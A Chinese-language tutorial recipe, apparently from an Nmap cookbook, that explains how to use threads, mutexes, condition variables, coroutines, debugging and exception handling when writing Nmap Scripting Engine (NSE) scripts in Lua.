Nmap 脚本引擎通过实现线程、条件变量和互斥锁，提供了对脚本并行性的更精细控制。每个 NSE 脚本通常在 Lua 协程或线程中执行，但如果程序员决定这样做，它可能会产生额外的工作线程。

这个方法将教你如何处理 NSE 中的并行性。

## 如何做...

NSE 线程建议用于需要并行执行网络操作的脚本。让我们看看如何处理我们脚本中的并行性：

1.  要创建一个新的 NSE 线程，使用库`stdnse`中的函数`new_thread()`：

```
    local co = stdnse.new_thread(worker_main_function, arg1, arg2, arg3, ...)
    ```

1.  为了同步访问网络资源，在对象上创建一个互斥锁：

```
    local my_mutex = nmap.mutex(object)
    ```

1.  然后，通过`nmap.mutex(object)`返回的函数可以如下锁定：

```
    my_mutex("trylock")
    ```

1.  在完成工作后，应使用函数`"done"`释放它：

```
    my_mutex("done")
    ```

1.  NSE 支持条件变量，以帮助您同步线程的执行。要创建条件变量，请使用函数`nmap.condvar(object)`：

```
    local o = {} 
    local my_condvar = nmap.condvar(o)
    ```

1.  之后，您可以等待、信号或广播条件变量：

```
    my_condvar("signal")
    ```

## 它是如何工作的...

NSE 脚本在进行网络操作时会透明地产生。脚本编写者可能希望执行并行的网络任务，比如脚本`http-slowloris`打开几个套接字并同时保持它们打开。NSE 线程通过允许脚本编写者产生并行网络操作来解决这个问题。

函数`stdnse.new_thread`的第一个参数是新工作线程的主函数。此函数将在创建新线程后执行。脚本编写者可以将任何额外的参数作为可选参数传递给`stdnse.new_thread()`。

```
local co = stdnse.new_thread(worker_main_function, arg1, arg2, arg3, ...)
```

NSE 忽略了工作线程的返回值，它们无法报告脚本输出。官方文档建议使用`upvalues`、函数参数或环境来将结果报告回基本线程。

执行后，它返回基本协程和状态查询函数。此状态查询函数返回最多两个值：使用基本`coroutine`的`coroutine.status`的结果，以及如果发生错误，则为错误对象。

互斥锁或互斥对象被实现用来保护诸如 NSE 套接字之类的资源。可以对互斥锁执行以下操作：

+   `lock`：锁定互斥锁。如果互斥锁被占用，工作线程将让出并等待直到释放。

+   `trylock`：尝试以非阻塞方式锁定互斥锁。如果互斥锁被占用，它将返回 false。（不会像`lock`函数那样让出。）

+   `done`：释放互斥锁。其他线程可以在此之后锁定它。

+   `running`：除了用于调试之外，根本不应该使用此函数，因为它会影响已完成线程的线程收集。

条件变量被实现以帮助开发人员协调线程之间的通信。可以对条件变量执行以下操作：

+   `broadcast`：恢复条件变量队列中的所有线程

+   `wait`：将当前线程添加到条件变量的等待队列中

+   `signal`：从等待队列中发出信号的线程

要阅读脚本并行性的实现，建议阅读 NSE 脚本`broadcast-ping`，`ssl-enum-ciphers`，`firewall-bypass`，`http-slowloris`或`broadcast-dhcp-discover`的源代码。

## 还有更多...

Lua 提供了一个有趣的功能，称为协程。每个协程都有自己的执行堆栈。最重要的部分是我们可以通过`coroutine.resume()`和`coroutine.yield()`挂起和恢复执行。引入了函数`stdnse.base()`来帮助确定主脚本线程是否仍在运行。它返回运行脚本的基本协程。

您可以从 Lua 的官方文档中了解有关协程的更多信息：

+   [`lua-users.org/wiki/CoroutinesTutorial`](http://lua-users.org/wiki/CoroutinesTutorial)

+   [`www.lua.org/pil/9.1.html`](http://www.lua.org/pil/9.1.html)

### 调试 NSE 脚本

如果发生意外情况，请打开调试以获取更多信息。Nmap 使用`-d`标志进行调试，您可以设置 0 到 9 之间的任何整数：

```
$ nmap -p80 --script http-google-email -d4 <target>

```

### 异常处理

`nmap`库为设计用于帮助网络 I/O 任务的 NSE 脚本提供了异常处理机制。

`nmap`库的异常处理机制按预期工作。我们将想要监视异常的代码包装在`nmap.try()`调用内。函数返回的第一个值表示完成状态。如果返回`false`或`nil`，则第二个返回值必须是错误字符串。在成功执行的其余返回值可以根据需要设置和使用。`nmap.new_try()`定义的`catch`函数将在引发异常时执行。

以下示例是脚本`mysql-vuln-cve2012-2122.nse`的代码片段（[`nmap.org/nsedoc/scripts/mysql-vuln-cve2012-2122.html`](http://nmap.org/nsedoc/scripts/mysql-vuln-cve2012-2122.html)）。在此脚本中，`catch`函数在套接字保持打开时执行一些简单的垃圾回收：

```
local catch = function()  socket:close() end
local try = nmap.new_try(catch)
…
  try( socket:connect(host, port) )
  response = try( mysql.receiveGreeting(socket) )
```

NSE 库`nmap`的官方文档可以在[`nmap.org/nsedoc/lib/nmap.html`](http://nmap.org/nsedoc/lib/nmap.html)找到。

## 另请参阅

+   *发出 HTTP 请求以识别易受攻击的 Trendnet 网络摄像头*配方

+   *使用 NSE 套接字发送 UDP 负载*配方

+   *利用 NSE 的路径遍历漏洞*配方

+   *编写暴力脚本*配方

+   *使用 Web 爬虫库*配方

+   *在 NSE 脚本中正确报告漏洞*配方
